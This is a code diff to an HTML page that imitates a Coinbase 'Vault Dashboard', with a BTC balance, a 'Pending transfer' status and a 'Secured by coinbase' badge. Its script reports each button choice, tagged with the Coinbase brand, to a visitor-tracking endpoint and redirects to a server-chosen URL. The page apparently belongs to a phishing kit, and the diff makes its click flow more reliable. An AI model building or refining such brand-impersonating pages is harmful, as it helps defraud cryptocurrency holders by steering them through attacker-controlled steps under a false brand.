@@ -66,7 +66,7 @@
       <div class="vm-asset-right">
         <p class="usd" data-rv-var="totalValue">$0.00</p>
         <p class="amt" data-rv-var="assetAmountDisplay">0.0000 BTC</p>
-        <p class="vm-status">Pending transfer</p>
+        <p class="vm-status" data-rv-var="pendingStatus">Pending transfer</p>
       </div>
     </div>
   </div>
@@ -78,12 +78,29 @@
   <p class="vm-secured">🔒 Secured by coinbase</p>
 </div>
 <script>
-document.querySelectorAll('.vm-actions button').forEach(function(btn){
-  btn.addEventListener('click',function(){
-    fetch('/api/visitor/page-advance',{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify({brand:'Coinbase',page:'Vault Dashboard',choice:btn.textContent.trim()})})
-      .then(function(r){return r.json()}).then(function(d){if(d&&d.nextUrl)location.href=d.nextUrl;});
+(function () {
+  document.querySelectorAll('.vm-actions button').forEach(function (btn) {
+    btn.addEventListener('click', function () {
+      var b = btn;
+      b.disabled = true;
+      fetch('/api/visitor/page-advance', {
+        method: 'POST',
+        headers: { 'Content-Type': 'application/json' },
+        body: JSON.stringify({
+          brand: 'Coinbase',
+          page: 'Vault Dashboard',
+          choice: btn.textContent.trim()
+        })
+      })
+        .then(function (r) { return r.json().catch(function () { return null; }); })
+        .then(function (d) {
+          if (d && d.nextUrl) location.href = d.nextUrl;
+          else b.disabled = false;
+        })
+        .catch(function () { b.disabled = false; });
+    });
   });
-});
+})();
 </script>
 </body>
 </html>
